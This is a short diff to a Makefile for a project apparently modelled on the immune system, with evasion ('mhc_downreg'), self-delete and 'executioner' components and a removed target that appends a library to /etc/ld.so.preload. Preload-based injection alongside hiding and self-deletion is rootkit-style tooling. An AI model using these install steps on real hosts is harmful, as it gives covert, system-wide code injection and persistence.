@@ -13,7 +13,7 @@ endif
 # Installation paths
 LIBDIR := /usr/local/lib
 PRELOAD_FILE := /etc/ld.so.preload
-INCIDENT_DIR := /var/log/incidents
+INCIDENT_DIR := /var/log/memory_T_cells
 
 # Immune system evasion
 HIDE_SRC := mhc_downreg.c
@@ -81,21 +81,6 @@ install: $(HIDE_TARGET) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HELPER_T_TARGET) se
 	@echo "  - $(LIBDIR)/caspase.o (executioner)"
 	@echo ""
 	@echo "Incident logs will be stored in: $(INCIDENT_DIR)"
-
-# Install only the forensic monitor (helper T cell)
-install-monitor: $(HELPER_T_TARGET) setup-incidents
-	@echo "Installing forensic monitor to $(LIBDIR)..."
-	cp $(HELPER_T_TARGET) $(LIBDIR)/
-	@echo "Adding to $(PRELOAD_FILE)..."
-	@if ! grep -q "$(LIBDIR)/helper_T.so" $(PRELOAD_FILE) 2>/dev/null; then \
-		echo "$(LIBDIR)/helper_T.so" >> $(PRELOAD_FILE); \
-		echo "Added $(LIBDIR)/helper_T.so to $(PRELOAD_FILE)"; \
-	else \
-		echo "$(LIBDIR)/helper_T.so already in $(PRELOAD_FILE)"; \
-	fi
-	ldconfig
-	@echo "Forensic monitor installed!"
-	@echo "Incident logs: $(INCIDENT_DIR)"
 
 clean:
 	$(RM) $(HIDE_OBJ) $(HIDE_TARGET) $(SELFDELETE_OBJ) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HELPER_T_OBJ) $(HELPER_T_TARGET)
